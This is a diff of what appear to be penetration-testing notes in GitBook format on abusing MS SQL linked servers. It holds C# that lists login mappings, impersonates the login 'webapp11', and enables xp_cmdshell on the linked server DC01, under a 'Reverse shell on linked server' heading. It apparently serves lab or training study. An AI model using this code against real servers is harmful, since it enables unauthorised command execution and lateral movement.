@@ -767,18 +767,18 @@ reader.Close();
                     ON S.server_id = LL.server_id
                 LEFT JOIN sys.server_principals SP
                     ON LL.local_principal_id = SP.principal_id
-                WHERE S.name = 'ZSM-SVRCSQL02';
+                WHERE S.name = 'SQL53';
                 ";
             SqlCommand cmd = new SqlCommand(sql, con);
             SqlDataReader rdr = cmd.ExecuteReader();
 
             if (!rdr.HasRows)
             {
-                Console.WriteLine("No login mappings found for linked server ZSM-SVRCSQL02.");
+                Console.WriteLine("No login mappings found for linked server SQL53.");
             }
             else
             {
-                Console.WriteLine("\nMappings for linked server ZSM-SVRCSQL02:\n");
+                Console.WriteLine("\nMappings for linked server SQL53:\n");
                 Console.WriteLine("{0,-30} {1,-30} {2,-12} {3}", "LocalLogin", "RemoteLogin", "SelfMapped", "LastModified");
                 Console.WriteLine(new string('-', 95));
 
@@ -796,9 +796,15 @@ reader.Close();
         
 </code></pre>
 
+<figure><img src="../.gitbook/assets/image (351).png" alt=""><figcaption><p>Must impersonate as webapp11 to execute sql queries on SQL53</p></figcaption></figure>
+
 * Reverse shell on linked server
-  *   ```csharp
-      //String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"dc01.corp2.com\";";
+  *   <pre class="language-csharp"><code class="lang-csharp"><strong>//string impersonateSql = "EXECUTE AS LOGIN = 'webapp11';";
+      </strong><strong>//using (var impCmd = new SqlCommand(impersonateSql, con))
+      </strong>//{
+      //    impCmd.ExecuteNonQuery();
+      //}
+
       String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"DC01\";";
       SqlCommand command = new SqlCommand(enable_xpcmd, con);
       command.ExecuteNonQuery();
@@ -815,7 +821,7 @@ reader.Close();
 
       Console.WriteLine("[+] Command executed successfully on DC01.");
 
-      ```
+      </code></pre>
 
 
 * Check if DC01 also links back to APPSrv01 ![](<../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1).png>)
